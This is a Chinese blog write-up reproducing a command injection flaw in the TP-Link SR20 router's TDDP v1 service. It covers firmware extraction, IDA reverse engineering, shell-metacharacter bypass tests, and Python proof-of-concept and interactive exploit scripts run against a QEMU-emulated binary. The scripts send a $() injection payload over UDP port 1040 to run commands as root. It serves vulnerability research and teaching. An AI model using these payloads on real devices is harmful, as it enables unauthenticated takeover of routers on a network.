---
title: "TP-Link SR20 TDDP v1 远程命令执行漏洞复现"
slug: "tp-link-sr20-tddp-rce"
date: "2026-07-13"
excerpt: "记录 TP-Link SR20 TDDP v1 协议远程命令执行漏洞的固件提取、逆向分析、过滤绕过、POC/EXP 编写及 QEMU 用户态模拟复现过程。"
category: "iot-security"
subcategory: "firmware-analysis"
image: "/anime-melancholy.png"
heroImage: "/article-hero-bg.png"
---
# TP-Link SR20 TDDP v1 远程命令执行漏洞复现报告

本文记录 TP-Link SR20 智能路由器 TDDP v1 协议远程命令执行漏洞的固件提取、逆向分析、过滤绕过、POC/EXP 编写及 QEMU 用户态模拟复现过程。仅用于授权环境下的安全研究与学习。

## 1. 漏洞信息

| 项目     | 详情                                                         |
|----------|--------------------------------------------------------------|
| 漏洞设备 | TP-Link SR20 智能路由器                                      |
| 漏洞编号 | CNVD/CNNVD 未分配，由 Google 安全研究员 Matthew Garrett 提交 |
| 漏洞类型 | 远程命令执行（RCE）                                          |
| 影响协议 | TDDP（TP-LINK Device Debug Protocol）v1                      |
| 漏洞端口 | UDP 1040                                                     |
| 认证要求 | 无，TDDP v1 不需要认证                                       |
| 利用条件 | 攻击者与目标设备位于同一局域网                               |
| 危害等级 | 严重（Critical），可通过 root 权限执行任意命令               |

TP-Link SR20 的 tddp 程序监听 UDP 1040 端口。TDDP v1 无需认证，局域网中的主机可以直接向该端口发送数据包。

当程序处理 CMD_FTEST_CONFIG，即 Type == 0x31 的请求时，会将用户可控数据拼接进 Shell 命令，并通过 system() 执行，从而造成命令注入。

## 2. 复现环境

本次复现使用以下环境：

- 宿主机：Windows 11
- 容器/虚拟环境：Docker Ubuntu 20.04
- 架构模拟：qemu-arm-static 用户态模拟
- 固件版本：SR20(US) V1.2.1 Build 20180518
- 固件压缩包：SR20(US)_V1_180518.zip
- 固件文件：

```text
tpra_sr20v1_us-up-ver1-2-1-P522_20180518-rel77140_2018-05-21_08.42.04.bin
```

## 3. 固件解包与文件系统提取

### 3.1 使用 Binwalk 扫描固件

```bash
binwalk tpra_sr20v1_us-up-ver1-2-1-P522_20180518-rel77140_2018-05-21_08.42.04.bin
```

扫描结果表明，固件主要由以下结构组成：

- LZMA 压缩内核
- TRX 分区表
- SquashFS 文件系统

Binwalk 识别出 SquashFS 文件系统的起始偏移为：

```text
0x212FF9
```

### 3.2 计算十进制偏移

```text
0x212FF9 = 2174969
```

tail -c +N 表示从第 N 个字节开始输出，而不是从偏移 N 开始，因此需要加 1：

```text
2174969 + 1 = 2174970
```

### 3.3 切割 SquashFS 文件系统

```bash
tail -c +2174970 \
  tpra_sr20v1_us-up-ver1-2-1-P522_20180518-rel77140_2018-05-21_08.42.04.bin \
  > squashfs.bin
```

也可以写成：

```bash
tail -c +2174970 firmware.bin > squashfs.bin
```

### 3.4 解压 SquashFS

方式一：直接指定输出目录。

```bash
unsquashfs -d squashfs-root squashfs.bin
```

方式二：先创建目录，再解压到当前目录。

```bash
mkdir squashfs-root
cd squashfs-root
unsquashfs -f ../squashfs.bin
```

![图 1：SquashFS 文件系统成功解压，生成文件、目录和符号链接](/blog-assets/tp-link-sr20-tddp-rce/figure-01.png)

*图 1：SquashFS 文件系统成功解压，生成文件、目录和符号链接*

### 3.5 提取后的主要目录

```text
squashfs-root/
├── bin/           # BusyBox 和基础系统命令
├── dev/
├── etc/           # 配置文件
├── lib/           # uClibc 等共享库
├── sbin/
├── tmp/
├── usr/
│   ├── bin/
│   │   └── tddp   # 本次漏洞分析的目标程序
│   ├── lib/       # liblua.so 等库
│   └── sbin/
├── var/
└── www/           # Web 管理界面
```

![图 2：AI 初步审计生成的漏洞热点文件清单（仅作为定位线索，最终结论以人工逆向验证为准）](/blog-assets/tp-link-sr20-tddp-rce/figure-02.png)

*图 2：AI 初步审计生成的漏洞热点文件清单（仅作为定位线索，最终结论以人工逆向验证为准）*

其中，开机自启程序、网络服务程序和监听端口的程序通常位于：

```text
bin/
sbin/
usr/bin/
usr/sbin/
```

## 4. 定位并识别 tddp 程序

### 4.1 查看文件类型

```bash
file squashfs-root/usr/bin/tddp
```

输出：

```text
ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV),
dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped
```

由此可以确认：

- 文件类型：ELF
- 架构：32 位 ARM
- ABI：EABI5
- 动态链接器：/lib/ld-uClibc.so.0
- 符号状态：已执行 strip

### 4.2 查看 ELF 头

```bash
readelf -h squashfs-root/usr/bin/tddp
```

关键输出：

```text
Machine: ARM
Entry point address: 0x9108
```

由于二进制经过 strip，函数名等符号信息被移除，因此 IDA 中通常无法直接看到名为 main 的函数。

![图 3：IDA 载入 tddp 后识别出的 ARM ELF、解释器和依赖库信息](/blog-assets/tp-link-sr20-tddp-rce/figure-03.png)

*图 3：IDA 载入 tddp 后识别出的 ARM ELF、解释器和依赖库信息*

## 5. 逆向分析过程

### 5.1 从 _start 定位 main 函数

程序入口函数近似如下：

![图 4：IDA 中的 _start 汇编入口及 _uClibc_main 调用](/blog-assets/tp-link-sr20-tddp-rce/figure-04.png)

*图 4：IDA 中的 _start 汇编入口及 _uClibc_main 调用*

```c
int start()
{
    // _uClibc_main 的第一个参数为 main 函数指针
    return ((int (__fastcall *)(int (*)()))_uClibc_main)(sub_971C);
}
```

![图 5：_start 的反编译伪代码，参数 sub_971C 被传入 _uClibc_main](/blog-assets/tp-link-sr20-tddp-rce/figure-05.png)

*图 5：_start 的反编译伪代码，参数 sub_971C 被传入 _uClibc_main*

根据 uClibc 的启动规范，可以判断：

```text
sub_971C ≈ main()
```

![图 6：sub_971C 的反编译结果：初始化、进入 sub_936C 主流程并在结束时回收资源](/blog-assets/tp-link-sr20-tddp-rce/figure-06.png)

*图 6：sub_971C 的反编译结果：初始化、进入 sub_936C 主流程并在结束时回收资源*

在 main() 中可以观察到：

- sub_16C90()：动态内存初始化或分配
- sub_16D40()：释放已分配的动态内存
- sub_936C()：位于二者之间，是后续分析的关键函数

### 5.2 Socket 初始化与端口绑定

sub_936C() 负责 Socket 的初始化，并调用 sub_16D68() 绑定端口。

![图 7：sub_936C 中的 Socket 创建、选项设置及 UDP 1040 端口绑定调用](/blog-assets/tp-link-sr20-tddp-rce/figure-07.png)

*图 7：sub_936C 中的 Socket 创建、选项设置及 UDP 1040 端口绑定调用*

![图 8：sub_16D68 中通过 htons(1040) 和 bind() 绑定 UDP 1040 端口](/blog-assets/tp-link-sr20-tddp-rce/figure-08.png)

*图 8：sub_16D68 中通过 htons(1040) 和 bind() 绑定 UDP 1040 端口*

还原后的伪代码如下：

```c
// fd_1：已创建的 Socket 文件描述符
// n1040：传入的端口号 1040
int bind_socket(int fd_1, uint16_t n1040)
{
    struct sockaddr_in s;

    memset(&s, 0, sizeof(s));

    s.sin_family = AF_INET;
    s.sin_addr.s_addr = htonl(0);
    s.sin_port = htons(n1040);

    if (bind(fd_1, (struct sockaddr *)&s, 16) == -1) {
        return err_print(-10103, "failed to bind socket");
    }

    return 0;
}
```

各字段含义：

```text
AF_INET               → 使用 IPv4
htonl(0)              → INADDR_ANY，即监听 0.0.0.0
htons(1040)           → 将端口号转为网络字节序
bind()                → 将 Socket 绑定到本地 UDP 1040 端口
```

![图 9：sub_936C 使用 select() 等待可读事件，并在收到数据后调用 sub_16418](/blog-assets/tp-link-sr20-tddp-rce/figure-09.png)

*图 9：sub_936C 使用 select() 等待可读事件，并在收到数据后调用 sub_16418*

因此可以确认，tddp 服务会监听：

```text
0.0.0.0:1040/UDP
```

sub_9340() 主要用于获取当前时间，与漏洞主线关系不大，可以暂时跳过。

![图 10：sub_9340 仅调用 gettimeofday() 并返回秒级时间戳](/blog-assets/tp-link-sr20-tddp-rce/figure-10.png)

*图 10：sub_9340 仅调用 gettimeofday() 并返回秒级时间戳*

### 5.3 接收 UDP 数据包

在 sub_16418() 中可以找到关键函数：

![图 11：sub_16418 通过 recvfrom() 将 UDP 数据读入 a1 + 45083 缓冲区](/blog-assets/tp-link-sr20-tddp-rce/figure-11.png)

*图 11：sub_16418 通过 recvfrom() 将 UDP 数据读入 a1 + 45083 缓冲区*

```c
recvfrom()
```

其原型为：

```c
ssize_t recvfrom(
    int sockfd,
    void *buf,
    size_t len,
    int flags,
    struct sockaddr *src_addr,
    socklen_t *addrlen
);
```

该函数用于从指定 Socket 接收远程主机发送的数据，并将数据写入缓冲区。

逆向结果表明，接收到的数据被写入类似以下位置：

```text
(char *)a1 + 45083
```

因此，发送到目标 UDP 1040 端口的 TDDP 数据包，会进入该缓冲区等待后续解析。

### 5.4 TDDP 版本和类型分发

程序会读取接收到的数据包，并判断 TDDP 版本。

![图 12：接收缓冲区首字节被取出并通过 n2 == 1 判断 TDDP v1，随后调用 sub_15E74](/blog-assets/tp-link-sr20-tddp-rce/figure-12.png)

*图 12：接收缓冲区首字节被取出并通过 n2 == 1 判断 TDDP v1，随后调用 sub_15E74*

其中：

```text
if (n2 == 1)
```

可理解为：

```text
TDDP Version == 1
```

进入 TDDP v1 分支后，程序继续调用 sub_15E74()，根据数据包中的 Type 字段进行分发。

![图 13：sub_15E74 读取第二个字节并通过 switch 对 TDDP Type 进行分发](/blog-assets/tp-link-sr20-tddp-rce/figure-13.png)

*图 13：sub_15E74 读取第二个字节并通过 switch 对 TDDP Type 进行分发*

分析各个 case 后，可以定位到可疑分支：

```text
case 0x31
```

该分支最终调用：

```text
sub_A580()
```

![图 14：case 0x31 对应 CMD_FTEST_CONFIG，并调用漏洞处理函数 sub_A580](/blog-assets/tp-link-sr20-tddp-rce/figure-14.png)

*图 14：case 0x31 对应 CMD_FTEST_CONFIG，并调用漏洞处理函数 sub_A580*

这就是 CMD_FTEST_CONFIG 对应的处理函数，也是本次漏洞的核心位置。

## 6. 漏洞函数 sub_A580()

### 6.1 协议头长度判断

程序会检查数据包的第一个字节：

![图 15：sub_A580 中请求缓冲区、响应缓冲区与版本字节指针的初始化](/blog-assets/tp-link-sr20-tddp-rce/figure-15.png)

*图 15：sub_A580 中请求缓冲区、响应缓冲区与版本字节指针的初始化*

- 等于 1：按照 TDDP v1 处理，跳过 12 字节协议头
- 不等于 1：按照另一版本处理，跳过 28 字节协议头

![图 16：根据版本号分别跳过 12 字节或 28 字节协议头](/blog-assets/tp-link-sr20-tddp-rce/figure-16.png)

*图 16：根据版本号分别跳过 12 字节或 28 字节协议头*

近似逻辑：

```text
if (*v13 == 1) {
    data += 12;
} else {
    data += 28;
}
```

可以判断：

```text
TDDP v1 协议头长度：12 字节
TDDP 另一版本协议头长度：28 字节
```

相关指针含义：

```text
s_1  → 客户端请求包的数据指针
v14  → 返回给客户端的响应包缓冲区
```

![图 17：TDDP 报文头字段结构示意图](/blog-assets/tp-link-sr20-tddp-rce/figure-17.png)

*图 17：TDDP 报文头字段结构示意图*

对于 TDDP v1：

```text
s_1 += 12  → 跳过请求头，指向请求数据区
v14 += 12  → 跳过响应头，指向响应数据区
```

### 6.2 漏洞伪代码还原

sub_A580() 的核心逻辑可以还原为：

![图 18：sscanf() 解析数据区，并将参数传给命令执行函数 sub_91DC](/blog-assets/tp-link-sr20-tddp-rce/figure-18.png)

*图 18：sscanf() 解析数据区，并将参数传给命令执行函数 sub_91DC*

```c
void tddp_handle_ftest_config(char *data, int len)
{
    char s[128];
    char s_[128];
    char cmd[256];

    // 以分号为分隔符解析两部分数据
    sscanf(data, "%[^;];%s", s, s_);

    // 程序对部分字符进行过滤，但未完整过滤 Shell 特殊字符
    // ...

    // 用户输入被直接拼接进 Shell 命令
    snprintf(cmd, 256, "cd /tmp;tftp -gr %s %s &", s, s_);

    // 漏洞点
    system(cmd);

    // 尝试加载下载到 /tmp 中的 Lua 脚本
    char lua_path[128];
    snprintf(lua_path, 128, "/tmp/%s", s);

    if (access(lua_path, F_OK) == 0) {
        luaL_loadfile(L, lua_path);
        lua_getfield(L, -1, "config_test");
        lua_pcall(L, 0, 0, 0);
    }
}
```

漏洞产生的根本原因是：

1.  sscanf() 从网络数据包中提取用户可控字符串；

2.  用户输入被直接拼接进 tftp Shell 命令；

3.  程序没有正确过滤 \$()、管道、后台执行符等 Shell 元字符；

4.  拼接后的命令被传递给 system() 执行。

### 6.3 system() 调用确认

sub_91DC() 最终进入 Shell 命令执行流程，可以进一步确认 sub_A580() 中构造的字符串确实被传递给 Shell 执行。

![图 19：sub_91DC 经 fork() 后调用 execve("/bin/sh", ["sh", "-c", cmd], ...) 执行命令](/blog-assets/tp-link-sr20-tddp-rce/figure-19.png)

*图 19：sub_91DC 经 fork() 后调用 execve("/bin/sh", ["sh", "-c", cmd], ...) 执行命令*

![图 20：再次核对 sscanf() 与命令执行调用点，确认用户输入进入 Shell 命令链路](/blog-assets/tp-link-sr20-tddp-rce/figure-20.png)

*图 20：再次核对 sscanf() 与命令执行调用点，确认用户输入进入 Shell 命令链路*

完整数据流如下：

```c
UDP 数据包
    ↓
recvfrom() 接收
    ↓
检查 Version == 1
    ↓
检查 Type == 0x31
    ↓
sscanf(data, "%[^;];%s", s, s_)
    ↓
snprintf(cmd, "cd /tmp;tftp -gr %s %s &", s, s_)
    ↓
system(cmd)
    ↓
命令注入 / 任意命令执行
```

## 7. TFTP 与 Lua 加载逻辑

程序构造的命令为：

```bash
cd /tmp; tftp -gr <文件名> <服务器地址> &
```

这里使用的是 **TFTP 协议**，不是普通 FTP。

主要参数含义：

```bash
cd /tmp       → 切换到临时目录
tftp          → 启动 TFTP 客户端
-g            → 获取文件
-r            → 指定远程文件名
&             → 后台执行
```

下载完成后，程序会将文件路径拼接为：

```text
/tmp/<文件名>
```

![图 21：固件文件系统中的 tmp 目录初始为空，可用于保存 TFTP 下载文件及命令输出](/blog-assets/tp-link-sr20-tddp-rce/figure-21.png)

*图 21：固件文件系统中的 tmp 目录初始为空，可用于保存 TFTP 下载文件及命令输出*

随后调用：

```c
luaL_loadfile()
```

加载 Lua 脚本，并尝试执行脚本中的：

```text
config_test
```

函数。

![图 22：sub_A580 构造 /tmp/<文件名> 路径，并通过 luaL_loadfile() 加载 Lua 脚本](/blog-assets/tp-link-sr20-tddp-rce/figure-22.png)

*图 22：sub_A580 构造 /tmp/<文件名> 路径，并通过 luaL_loadfile() 加载 Lua 脚本*

## 8. sscanf() 分隔逻辑

核心解析语句：

```text
sscanf(s_1, "%[^;];%s", s, s_);
```

![图 23：sscanf() 使用分号将数据区拆分为两个字符串](/blog-assets/tp-link-sr20-tddp-rce/figure-23.png)

*图 23：sscanf() 使用分号将数据区拆分为两个字符串*

数据格式：

```text
<s>;<s_>
```

示例：

```text
输入：test;192.168.1.1
```

解析结果：

```text
s  = "test"
s_ = "192.168.1.1"
```

最终构造的命令：

```bash
cd /tmp; tftp -gr test 192.168.1.1 &
```

%\[^;\] 会一直读取到分号为止，因此分号本身不能直接出现在第一部分字符串中，但其他 Shell 特殊字符仍可能被利用。

## 9. 特殊字符过滤与绕过测试

测试的特殊字符包括：

```text
;
|
&
`
$()
```

初步分析结果：

| Payload | 是否被过滤 | 理论结果 | 说明                                    |
|---------|------------|----------|-----------------------------------------|
| ;id     | 是         | 无法执行 | sscanf() 使用分号分隔，第一部分会被截断 |
| x\\id   | 否         | 理论可行 | 可能形成 TFTP 与 id 的管道              |
| x&id    | 否         | 理论可行 | 可能使用后台执行符分隔命令              |
| \`id\`  | 不完全确定 | 理论可行 | 使用反引号进行命令替换                  |
| \$(id)  | 否         | 稳定可行 | 使用 \$() 进行命令替换                  |

## 10. POC：测试不同绕过方式

```python
from socket import *
import os
import time

# TDDP v1 + Type 0x31，并补足到 12 字节协议头
HEADER = b"\x01\x31".ljust(12, b"\x00")

OUTFILE = "/root/sq/tmp/sh_out"
PIDFILE = "/tmp/tddp.pid"

methods = [
    ("$(id)", b"$(id>/tmp/sh_out);winmt"),
    ("x|id",  b"x|id>/tmp/sh_out;winmt"),
    ("x&id",  b"x&id>/tmp/sh_out;winmt"),
    ("`id`",  b"`id>/tmp/sh_out`;winmt"),
]

for name, data in methods:
    # 终止旧的 tddp 进程
    try:
        old = open(PIDFILE).read().strip()
        os.system(f"kill {old} 2>/dev/null")
    except Exception:
        pass

    time.sleep(0.5)

    # 使用 QEMU 用户态模拟重新启动 ARM 版 tddp
    os.system(
        "nohup chroot /root/sq "
        "/usr/bin/qemu-arm-static /usr/bin/tddp "
        ">/dev/null 2>&1 & echo $! > /tmp/tddp.pid"
    )

    time.sleep(2)

    # 向本机 UDP 1040 端口发送 TDDP 数据包
    sock = socket(AF_INET, SOCK_DGRAM, 0)
    sock.settimeout(3)
    sock.sendto(HEADER + data, ("127.0.0.1", 1040))
    sock.close()

    time.sleep(0.5)

    # 读取命令执行结果
    try:
        output = open(OUTFILE).read().strip()
        print(f"{name:10s} → {output}")
    except Exception:
        print(f"{name:10s} → FAIL")
```

## 11. QEMU 环境测试结果

| 方法   | Payload 格式  | 执行结果                                  |
|--------|---------------|-------------------------------------------|
| \$()   | \$(cmd);winmt | 成功                                      |
| \\     | x\\cmd;winmt  | 失败，可能与 TFTP 管道行为有关            |
| &      | x&cmd;winmt   | 失败，可能与 BusyBox Shell 的解析行为有关 |
| 反引号 | \`cmd\`;winmt | 失败，可能被程序过滤或受到命令上下文影响  |

测试结果表明，在当前 QEMU 用户态模拟环境中，最稳定的方式是：

```text
$() 命令替换
```

例如，在授权实验环境中，可以使用 \$() 验证命令是否被执行，并将结果写入临时文件。

![图 24：test_methods.py 对多种 Shell 特殊字符的动态测试结果](/blog-assets/tp-link-sr20-tddp-rce/figure-24.png)

*图 24：test_methods.py 对多种 Shell 特殊字符的动态测试结果*

## 12. EXP：交互式命令执行验证

```python
from socket import *
import os
import time

HEADER = b"\x01\x31".ljust(12, b"\x00")

# chroot 内的 /tmp/sh_out 对应宿主机上的路径
OUTFILE = "/root/sq/tmp/sh_out"

# 保存 tddp 进程号，方便每次执行前重新启动
PIDFILE = "/tmp/tddp.pid"
```


```python
def start_tddp():
    try:
        old_pid = open(PIDFILE).read().strip()
        os.system(f"kill {old_pid} 2>/dev/null")
    except Exception:
        pass

    time.sleep(0.5)

    os.system(
        "nohup chroot /root/sq "
        "/usr/bin/qemu-arm-static /usr/bin/tddp "
        ">/dev/null 2>&1 & echo $! > /tmp/tddp.pid"
    )

    time.sleep(1.5)
```


```python
def exec_cmd(cmd):
    start_tddp()

    # 将标准输出和标准错误都写入 /tmp/sh_out
    payload = (
        HEADER
        + f"$({cmd} > /tmp/sh_out 2>&1);winmt".encode()
    )

    sock = socket(AF_INET, SOCK_DGRAM, 0)
    sock.settimeout(3)
    sock.sendto(payload, ("127.0.0.1", 1040))
    sock.close()

    time.sleep(0.5)

    try:
        return open(OUTFILE).read()
    except Exception:
        return ""
```


```text
while True:
    try:
        cmd = input("$ ").strip()
    except (EOFError, KeyboardInterrupt):
        break

    if cmd in ("exit", "quit"):
        break

    if cmd:
        print(exec_cmd(cmd).rstrip())
```

运行逻辑：

```bash
1. 终止旧的 tddp 进程
2. 使用 chroot + qemu-arm-static 启动 ARM 版 tddp
3. 读取用户输入的命令
4. 构造 TDDP v1 / Type 0x31 数据包
5. 通过 UDP 发送至 127.0.0.1:1040
6. 命令输出写入 /tmp/sh_out
7. 宿主环境读取结果并显示
8. 输入 exit 或 quit 退出
```

![图 25：interactive_shell.py 成功执行 ls 和 cat 命令，并返回 root 权限结果](/blog-assets/tp-link-sr20-tddp-rce/figure-25.png)

*图 25：interactive_shell.py 成功执行 ls 和 cat 命令，并返回 root 权限结果*

## 13. 为什么每次执行前都要重启 tddp

system() 会阻塞并等待子进程退出。

程序执行的原始命令中包含：

```bash
tftp -gr ...
```

在没有可用 TFTP 服务器时，tftp 可能持续等待并在较长时间后才超时。在此期间：

- system() 一直阻塞；
- tddp 主循环无法继续处理新的请求；
- 后续发送的数据包可能得不到处理。

因此，POC 和 EXP 在每次发包前都会：

1.  读取旧的 PID；

2.  使用 kill 终止旧进程；

3.  重新启动一个干净的 tddp 进程；

4.  再发送新的测试数据包。

## 14. 实际攻击面

只要攻击者与 TP-Link SR20 位于同一局域网，就可以直接向设备 IP 的 UDP 1040 端口发送构造后的 TDDP v1 数据包。

利用链不需要前置认证：

```text
同一局域网
    ↓
目标 UDP 1040 端口可达
    ↓
构造 TDDP v1、Type 0x31 请求
    ↓
触发 system() 命令注入
    ↓
以 tddp 进程权限执行命令
```

![图 26：攻击面与漏洞利用路径示意：通过 UDP 1040 触发 tddp 高权限命令执行](/blog-assets/tp-link-sr20-tddp-rce/figure-26.png)

*图 26：攻击面与漏洞利用路径示意：通过 UDP 1040 触发 tddp 高权限命令执行*

由于该服务通常以高权限运行，因此漏洞可能导致以 root 权限执行任意命令。

## 15. 未完成事项及后续计划

当前仍需继续加强的内容：

- POC 编写不够熟练；
- Python socket 模块使用经验不足；
- 过去更熟悉 pwntools，需要补充原生 Socket 编程；
- 协议字段、校验字段和响应包结构仍可进一步还原；
- 后续可以补充真实设备或更完整系统仿真环境中的验证；
- 可以继续完善异常处理、参数解析和目标地址配置。

## 16. 本次学习收获

本次复现涉及的主要知识点包括：

- IoT 固件结构识别
- Binwalk 固件扫描
- SquashFS 文件系统切割与提取
- ARM ELF 文件识别
- uClibc 程序入口分析
- Strip 二进制中的 main 函数定位
- UDP Socket 初始化与端口绑定
- recvfrom() 数据接收流程
- 私有协议版本和类型字段分析
- IDA 伪代码审计
- sscanf() 数据解析
- snprintf() 命令拼接
- system() 命令注入
- Shell 特殊字符过滤绕过
- QEMU User Mode Emulation
- chroot 固件用户态模拟
- Python Socket POC/EXP 编写
- Lua 脚本加载逻辑分析

## 17. 对 IoT 安全方向的认识

IoT 是 Internet of Things，即物联网。它通过网络连接物理设备、传感器和各类终端，实现数据收集、交换和智能化管理。

IoT 安全并不局限于传统 CTF 中的单一方向，而是更接近综合型实战，通常会同时涉及：

- RE：固件程序和协议逆向分析
- PWN：内存破坏和漏洞利用
- Web：设备管理后台和接口安全
- Linux：嵌入式系统环境与权限分析
- 网络协议：私有协议和数据包结构分析
- 密码学：固件签名、加密通信和认证机制
- 硬件：UART、JTAG、Flash 提取等

本次 TP-Link SR20 漏洞属于较经典的 IoT 漏洞案例，主要使用了：

```text
固件分析
+ ARM 程序逆向
+ 私有协议分析
+ 命令注入审计
+ QEMU 用户态模拟
+ Python Socket 利用
```

AI 工具可以明显提升初期函数筛选、伪代码解释和调用链梳理的效率，例如：

```text
IDA MCP
+ Claude Code
+ Skills
```

但 AI 的分析结果仍需要结合反编译代码、动态验证和协议数据流进行人工确认。

## 18. 参考资料

- Matthew Garrett 原始漏洞报告
- IoTsec-Zone：《一些经典 IoT 漏洞的分析与复现（新手向）》
- TP-Link TDDP 协议相关专利文档
- Debian Wiki：QEMU User Mode Emulation
- 看雪安全社区：TP-Link 设备调试协议（TDDP）研究
- 参考文章：https://www.iotsec-zone.com/article/384
- QEMU 用户态模拟：https://wiki.debian.org/QemuUserEmulation

## 19. 总结

本次漏洞复现的核心结论如下：

```c
TP-Link SR20 开放 UDP 1040
    ↓
TDDP v1 无需认证
    ↓
Type 0x31 进入 CMD_FTEST_CONFIG 处理逻辑
    ↓
用户输入经 sscanf() 解析
    ↓
输入被 snprintf() 拼接进 TFTP Shell 命令
    ↓
system() 执行命令
    ↓
$() 命令替换可稳定触发命令注入
    ↓
实现远程命令执行
```


